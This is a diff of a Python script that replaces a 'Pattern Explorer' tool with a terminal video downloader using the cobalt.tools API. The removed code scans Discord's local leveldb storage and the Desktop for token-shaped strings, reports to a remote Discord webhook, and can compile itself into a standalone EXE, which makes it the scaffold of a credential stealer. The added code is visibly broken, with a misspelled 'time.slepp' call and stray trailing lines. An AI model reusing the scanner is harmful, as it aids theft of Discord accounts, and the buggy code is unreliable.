@@ -1,340 +1,170 @@
-import os
-import re
-import random
-import time
-import string
-import subprocess
-import sys
-import logging
 import json
-from datetime import datetime
-from urllib.request import Request, urlopen
-from urllib.error import URLError, HTTPError
-
-# --- CONFIGURATION ---
-DIRECTO RIES_TO_SEARCH = [
-    r"%APPDATA%\discord\Local Storage\leveldb",
-    r"%userprofile%\Desktop"
-]
-
-VALID_EXTENSIONS = ('.txt', '.log', '.csv', '.json', '.md')
-REGEX_PATTERN = r"\b[a-zA-Z0-9]{24,28}\b"
-LOG_FILE_NAME = "scanner_audit.log"
-CONFIG_FILE_NAME = "config.json"
-# ---------------------
+import urllib.request
+import urllib.parse
+import re
+import sys
+import os
+import time
 
 
-class DiscordWebhookHandler(logging.Handler):
-    """Custom logging handler to route log statements to a Discord channel via Webhooks."""
-    def __init__(self, webhook_url):
-        super().__init__()
-        self.webhook_url = webhook_url
+# --- CYBERPUNK THEME COLORS ---
+CYAN = "\033[96m"
+GREEN = "\033[92m"
+MAGENTA = "\033[95m"
+YELLOW = "\033[93m"
+RED = "\033[91m"
+RESET = "\033[0m"
+BOLD = "\033[1m"
 
-    def emit(self, record):
-        if not self.webhook_url:
-            return  # Skip if URL is not configured
+# The master dataset of official supported engines
+SUPPORTED_PLATFORMS = {
+    "youtube": "Full support (Videos, Shorts, YT Music, up to 4K)",
+    "tiktok": "Full support (High-quality videos without watermarks)",
+    "instagram": "Full support (Reels, Videos, IGTV, Photos)",
+    "twitter": "Full support (Videos, Multi-image posts)",
+    "x": "Full support (Videos, Multi-image posts)",
+    "reddit": "Full support (Native videos & GIFs with audio)",
+    "twitch": "Clips support available",
+    "vimeo": "Full support (Up to 4K streams)",
+    "bilibili": "Video and audio stream extraction supported",
+    "dailymotion": "Full video and metadata extraction supported",
+    "snapchat": "Public Spotlights and Stories supported",
+    "soundcloud": "Direct raw audio file streaming supported",
+    "pinterest": "Static photos, Story pins, and Video pins supported",
+    "tumblr": "Embedded text-post videos and audio clips supported",
+    "streamable": "Raw video streaming supported"
+}
 
-        log_entry = self.format(record)
-        
-        # Color-code based on severity level
-        if record.levelno >= logging.ERROR:
-            color = 15158332  # Red
-        elif record.levelno >= logging.WARNING:
-            color = 15105570  # Orange
-        else:
-            color = 3447003   # Blue
+def show_banner():
+    # Your custom ASCII art logo
+    print(f"{CYAN}{BOLD}")
+    print(r" _   _ _______  ___   _ ____  ")
+    print(r"| \ | | ____\ \/ / | | / ___| ")
+    print(r"|  \| |  _|  \  /| | | \___ \ ")
+    print(r"| |\  | |___ /  \| |_| |___) |")
+    print(r"|_| \_|_____/_/\_\\___/|____/ ")
+    print(f"{MAGENTA}       ⚡ MOBILE DOWNLOADER v3.5 ⚡   ")
+    print(f"{CYAN}=" * 35 + f"{RESET}\n")
 
-        # Fixed the unterminated f-string by using triple double-quotes
-        payload = {
-            "embeds": [
-                {
-                    "title": f"System Log - {record.levelname}",
-                    "description": f"""```txt\n{log_entry}\n```""",
-                    "color": color,
-                    "timestamp": datetime.utcfromtimestamp(record.created).isoformat() + "Z"
-                }
-            ]
-        }
-
-        try:
-            req = Request(
-                self.webhook_url,
-                data=json.dumps(payload).encode('utf-8'),
-                headers={
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-                },
-                method='POST'
-            )
-            with urlopen(req, timeout=5):
-                pass
-        except (URLError, HTTPError):
-            pass
-
-
-def load_webhook_url():
-    """Attempts to dynamically read the webhook token from an external config file."""
-    if os.path.exists(CONFIG_FILE_NAME):
-        try:
-            with open(CONFIG_FILE_NAME, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-                return data.get("discord_webhook_url", "").strip()
-        except Exception:
-            pass
-    return ""
-
-
-# --- LOGGER INITIALIZATION ---
-logger = logging.getLogger()
-logger.setLevel(logging.INFO)
-log_formatter = logging.Formatter('%(asctime)s - [%(levelname)s] - %(message)s')
-
-# 1. Local File Logging Handler
-file_handler = logging.FileHandler(LOG_FILE_NAME, mode='a', encoding='utf-8')
-file_handler.setFormatter(log_formatter)
-logger.addHandler(file_handler)
-
-# 2. Dynamic Discord Webhook Logging Handler
-webhook_url = load_webhook_url()
-if webhook_url:
-    discord_handler = DiscordWebhookHandler(webhook_url)
-    discord_handler.setFormatter(log_formatter)
-    logger.addHandler(discord_handler)
-else:
-    print("[!] Notice: No external 'config.json' discovered. Logging exclusively to local text file.")
-# -----------------------------
-
-
-def generate_random_alphanumeric_string(length):
-    """Generates a continuous string composed purely of mixed-case letters and digits."""
-    characters = string.ascii_letters + string.digits
-    return "".join(random.choice(characters) for _ in range(length))
-
-
-def run_test_environment():
-    """
-    [FEATURE 1] TEST MODE
-    Generates 50 complex alphanumeric noise lines and exactly 1 hidden target line
-    """
-    logging.info("Starting routine: TEST MODE simulation environment.")
-    test_filename = "regex_complex_test_sandbox.txt"
-    print(f"\n[~] Launching Test Mode: Generating '{test_filename}' with alphanumeric noise...")
-    
-    prefixes = ["ERR_LOG", "SYS_STATE", "AUTH_DEBUG", "PACKET_DUMP", "METRIC_v2"]
-    operations = ["fetch_session", "handshake_init", "callback_payload", "db_commit_failure"]
-    statuses = ["STATUS=404", "FLAGS=0x7F", "RESULT=TERMINATED", "RETRY_COUNT=3"]
-
-    lines_pool = []
-
-    for i in range(50):
-        prefix = random.choice(prefixes)
-        op = random.choice(operations)
-        stat = random.choice(statuses)
-        
-        random_hash_1 = generate_random_alphanumeric_string(random.randint(6, 12))
-        random_hash_2 = generate_random_alphanumeric_string(random.randint(8, 16))
-        
-        if i % 2 == 0:
-            invalid_digits = "".join(str(random.randint(0, 9)) for _ in range(random.randint(5, 12)))
-        else:
-            invalid_digits = "".join(str(random.randint(0, 9)) for _ in range(random.randint(35, 45)))
-            
-        simulated_line = f"<{random_hash_1}> {prefix}::{op} [{stat}] - StringData: \"{random_hash_2}\" ID:{invalid_digits}"
-        lines_pool.append(simulated_line)
-
-    simulated_token = generate_random_alphanumeric_string(26)
-    target_line_index = random.randint(0, 49)
-    lines_pool.insert(target_line_index, f"authorization_callback verified secure identifier payload: {simulated_token}")
-
-    summary_line_number = 0
-    summary_line_content = ""
-    summary_extracted_code = ""
-
-    try:
-        with open(test_filename, 'w', encoding='utf-8') as f:
-            f.write("\n".join(lines_pool))
-        
-        print(f"[+] Sandbox file written. Beginning step-by-step terminal evaluation stream (0.5s intervals)...\n")
-        print("=" * 95)
-        print(f" {'LINE':<8} | {'STREAMING SENTENCE CONTENT AND EVALUATION STATUS'}")
-        print("=" * 95)
-        
-        target_pattern = re.compile(REGEX_PATTERN)
-        
-        with open(test_filename, 'r', encoding='utf-8') as f:
-            for line_num, line in enumerate(f, 1):
-                clean_line = line.strip()
-                matches = target_pattern.findall(clean_line)
-                
-                if matches:
-                    for match in matches:
-                        summary_line_number = line_num
-                        summary_line_content = clean_line
-                        summary_extracted_code = match
-                        
-                        print(f" Line {line_num:02d} | [ FOUND TARGET MATCH ]")
-                        print(f"          └─> Content: \"{clean_line}\"")
-                        print(f"          └─> Extracted Code ({len(match)} chars): {match}")
-                        print("-" * 95)
-                else:
-                    print(f" Line {line_num:02d} | [ SCANNING ] Passed: \"{clean_line}\"")
-                
-                time.sleep(0.5)
-                    
-        print("=" * 95)
-        print(f"[~] Test complete. Evaluated 51 lines total.")
-        print("-" * 95)
-        print(">>> DETAILED DISCOVERY SUMMARY REPORT <<<")
-        print(f"  • Located On Line   : {summary_line_number}")
-        print(f"  • Extracted Code    : {summary_extracted_code}")
-        print("-" * 95)
-        
-        os.remove(test_filename)
-        
-        logging.info(f"TEST MODE completed. Match found successfully on simulated line {summary_line_number}. Isolated data string length: {len(summary_extracted_code)}")
-        print(f"[+] Operations updated successfully.")
-        
-    except Exception as e:
-        error_msg = f"Error executing test mode sandbox: {e}"
-        logging.error(error_msg)
-        print(f"[!] {error_msg}")
-
-
-def scan_for_numeric_patterns():
-    """
-    [FEATURE 2] LIVE SCANNED ENVIRONMENT RUN
-    Crawls local storage directories, logs matches and files scanned locally.
-    """
-    logging.info("Starting routine: LIVE SCAN operations initiated.")
-    target_pattern = re.compile(REGEX_PATTERN)
-    match_counter = 0
-    files_scanned_count = 0
-
-    print("\nInitializing Live Multi-Directory Structural Scan...")
-    print("=" * 70)
-
-    for raw_path in DIRECTORIES_TO_SEARCH:
-        absolute_directory = os.path.expandvars(raw_path)
-
-        if not os.path.exists(absolute_directory):
-            logging.warning(f"Scan path target missing or unavailable: '{absolute_directory}'")
-            print(f"\n[!] Skipping Folder: '{absolute_directory}' (Path not found)")
-            continue
-
-        print(f"\n[+] Entering Folder Tree: {absolute_directory}")
-        print("-" * 70)
-
-        for root, _, files in os.walk(absolute_directory):
-            for file_name in files:
-                file_path = os.path.join(root, file_name)
-                
-                if file_name.lower().endswith(VALID_EXTENSIONS):
-                    files_scanned_count += 1
-                    
-                    try:
-                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as active_file:
-                            for line_number, line in enumerate(active_file, 1):
-                                discovered_matches = target_pattern.findall(line)
-                                for code in discovered_matches:
-                                    match_counter += 1
-                                    print(f"\n[*] MATCH #{match_counter:03d} DISCOVERED!")
-                                    print(f"    Location: {file_path}")
-                                    print(f"    Line No : {line_number}")
-                                    
-                                    logging.info(f"MATCH DISCOVERED: File='{file_path}' Line={line_number}")
-                    except (PermissionError, FileNotFoundError):
-                        logging.warning(f"Read failure or access denied on local file: '{file_path}'")
-                        continue
-
-    print("\n" + "=" * 70)
-    print(f"Live Scan Phase Complete. Found and displayed {match_counter} total match(es).")
-    
-    logging.info(f"LIVE SCAN finished. Total files inspected: {files_scanned_count}. Total distinct pattern matches recorded: {match_counter}.")
-    print(f"[+] Operational audit saved and logged successfully.")
-
-
-def build_self_into_executable():
-    """
-    [FEATURE 3] COMPILATION AUTOMATION
-    Prompts user for the sensitive webhook URL configuration directly in the terminal,
-    saves it to a distribution configuration file, and builds the standalone binary.
-    """
-    logging.info("Starting routine: EXECUTABLE COMPILATION requested.")
-    print("\n=== COMPILATION MANAGER ===")
-    desired_name = input("Enter the target name for the output executable (e.g., DataScanner): ").strip()
-    
-    if not desired_name:
-        print("[!] Execution aborted: valid name string missing.")
-        logging.warning("Compilation canceled: user provided an empty string filename input.")
+def progress_hook(block_num, block_size, total_size):
+    if total_size <= 0:
         return
-
-    # Clean the input filename string
-    desired_name = os.path.splitext(desired_name)[0]
-    desired_name = "".join(c for c in desired_name if c.isalnum() or c in ('_', '-'))
-
-    # SECURE TERMINAL PROMPT FOR WEBHOOK TOKEN/URL
-    print("\n--- REMOTE WEBHOOK PROMPT ---")
-    webhook_input = input("Paste your Discord Webhook URL (Leave empty to skip remote logging): ").strip()
-
-    current_script_path = os.path.abspath(__file__)
-    dist_folder = os.path.join(os.path.dirname(current_script_path), "dist")
+    downloaded = block_num * block_size
+    percent = min(100, int(downloaded * 100 / total_size))
     
-    print(f"\n[1] Current source targeted: {current_script_path}")
-    print(f"[2] Invoking compiler settings for single binary package configuration...")
+    bar_length = 20
+    filled_length = int(bar_length * percent // 100)
+    bar = f"{GREEN}█{RESET}" * filled_length + f"{CYAN}░{RESET}" * (bar_length - filled_length)
     
-    command = [
-        sys.executable, "-m", "PyInstaller",
-        "--onefile",
-        "--name", desired_name,
-        current_script_path
-    ]
+    downloaded_mb = downloaded / (1024 * 1024)
+    total_mb = total_size / (1024 * 1024)
+    
+    sys.stdout.write(
+        f"\r{YELLOW}⚡ DOWNLOADING: [{bar}] {BOLD}{percent}%{RESET} ({downloaded_mb:.1f}/{total_mb:.1f} MB)"
+    )
+    sys.stdout.flush()
+
+def clean_filename(title):
+    return re.sub(r'[\\/*?:"<>|]', "", title)
+
+def run_search_bar():
+    while True:
+        print("\033[H\033[J", end="") # Clear Screen
+        show_banner()
+        print(f"{CYAN}{BOLD}[ PLATFORM COMPATIBILITY DATABASE ]{RESET}\n")
+        print(f"{YELLOW}Type a platform name to verify module integration.")
+        print(f"Type 'exit' to head back to the Main Menu.{RESET}\n")
+        
+        query = input(f"{MAGENTA}🔍 SEARCH ➔ {RESET}").strip().lower()
+        
+        if query == 'exit':
+            break
+        elif not query:
+            continue
+            
+        print("\n" + f"{CYAN}-" * 35 + f"{RESET}")
+        
+        matches = [key for key in SUPPORTED_PLATFORMS if query in key]
+        
+        if matches:
+            for match in matches:
+                print(f"{GREEN}[✔] MATCH FOUND: {BOLD}{match.upper()}{RESET}")
+                print(f"    ↳ Status: {SUPPORTED_PLATFORMS[match]}")
+        else:
+            print(f"{RED}[✘] NO COMPATIBLE UPLINK FOUND FOR: '{query}'{RESET}")
+            
+        print(f"{CYAN}-" * 35 + f"{RESET}")
+        input(f"\n{BOLD}Press ENTER to clear search and try again...{RESET}")
+
+def mobile_download(video_url):
+    print("\033[H\033[J", end="") 
+    show_banner()
+    print(f"{YELLOW}📡 Pinging backend matrix architecture...{RESET}")
+    
+    api_url = "https://api.cobalt.tools/api/json"
+    data = json.dumps({"url": video_url}).encode('utf-8')
+    
+    req = urllib.request.Request(
+        api_url, 
+        data=data, 
+        headers={
+            'Accept': 'application/json',
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0'
+        }
+    )
     
     try:
-        result = subprocess.run(command, capture_output=False, text=True)
-        
-        if result.returncode == 0:
-            # If the user supplied a webhook token, build out their config package directly inside the output \dist\ folder
-            if webhook_input:
-                os.makedirs(dist_folder, exist_ok=True)
-                target_config_path = os.path.join(dist_folder, CONFIG_FILE_NAME)
+        with urllib.request.urlopen(req) as response:
+            res_data = json.loads(response.read().decode('utf-8'))
+            
+            if res_data.get('status') in ['stream', 'picker']:
+                download_url = res_data.get('url')
+                video_title = res_data.get('filename', 'video')
+                filename = clean_filename(video_title) + ".mp4"
                 
-                with open(target_config_path, 'w', encoding='utf-8') as cfg_file:
-                    json.dump({"discord_webhook_url": webhook_input}, cfg_file, indent=4)
+                print(f"\n{GREEN}[✔] TARGET CORRELATION ESTABLISHED!{RESET}")
+                print(f"{MAGENTA}🎬 Title:{RESET} {BOLD}{video_title}{RESET}\n")
                 
-                print(f"[+] Security Profile Generated: Configured dynamic hook mapping saved into distribution folder.")
-
-            logging.info(f"COMPILATION SUCCESSFUL. Standalone binary created named: '{desired_name}.exe'")
-            print(f"\n[+] Production Completed successfully!")
-            print(f"[+] Navigate to the '\\dist\\' folder to find '{desired_name}.exe' and its corresponding '{CONFIG_FILE_NAME}'.")
-            print("[!] Note: To ensure remote logging works, keep the 'config.json' file in the same directory as the '.exe'.")
-        else:
-            logging.error(f"COMPILATION FAILED. PyInstaller returned error code: {result.returncode}")
-            print("\n[!] PyInstaller encountered a structural failure during translation processing.")
+                urllib.request.urlretrieve(download_url, filename, reporthook=progress_hook)
+                
+                print(f"\n\n{GREEN}{BOLD}█" * 35)
+                print(f"🎉 FILE SECURED INTO WORKSPACE SUCCESSFULLY 🎉")
+                print(f"█" * 35 + f"{RESET}\n")
+            else:
+                print(f"\n{RED}[✘] ERROR: Core parsing failed. Check link visibility status.{RESET}")
+                
     except Exception as e:
-        logging.error(f"Critical exception thrown during build sequence: {e}")
-        print(f"[!] Compilation engine threw a critical handler error: {e}")
-
+        print(f"\n{RED}[✘] CRITICAL REJECTION: Link handshaking failed.{RESET}")
+        print(f"{YELLOW}Details: {e}{RESET}\n")
+    
+    input(f"{BOLD}Press ENTER to return to Main Menu...{RESET}")
 
 if __name__ == "__main__":
-    print("=========================================")
-    print("     PATTERN EXPLORER SYSTEM TERMINAL     ")
-    print("=========================================")
-    print(" Available Engine Routines:")
-    print("  [test]  - Sandbox simulator (50 dummy lines vs. 1 valid code)")
-    print("  [run]   - Real multi-directory live scanner scan")
-    print("  [build] - Compile this complete program setup into a custom standalone EXE")
-    print("=========================================")
-    
-    user_choice = input("Select a function routine (test/run/build): ").strip().lower()
-
-    if user_choice == "test":
-        run_test_environment()
-    elif user_choice == "run":
-        scan_for_numeric_patterns()
-    elif user_choice == "build":
-        build_self_into_executable()
-    else:
-        print("[!] Mode choice not recognized. Exiting application layer.")
-        logging.warning(f"Application terminated: Invalid startup command input offered: '{user_choice}'")
+    while True:
+        print("\033[H\033[J", end="") # Clear layout screen
+        show_banner()
         
-    input("\nExecution sequence finished. Press Enter to close process...")
+        print(f"{BOLD}SELECT TASK INDEX:{RESET}")
+        print(f"[{MAGENTA}1{RESET}] Download video from URL link")
+        print(f"[{MAGENTA}2{RESET}] Launch Platform Search Database")
+        print(f"[{MAGENTA}3{RESET}] Close Program\n")
+        
+        choice = input(f"{CYAN}➔ Terminal Command: {RESET}").strip()
+        
+        if choice == '1':
+            print("\033[H\033[J", end="")
+            show_banner()
+            url = input(f"{MAGENTA}{BOLD}🔗 PASTE LINK HERE ➔ {RESET}")
+            if url:
+                mobile_download(url)
+        elif choice == '2':
+            run_search_bar()
+        elif choice == '3':
+            print(f"\n{YELLOW}Terminating session. Session Closed.{RESET}\n")
+            break
+
+
+time.slepp(1)
+print("wait 1sec")
+os.system("clear")
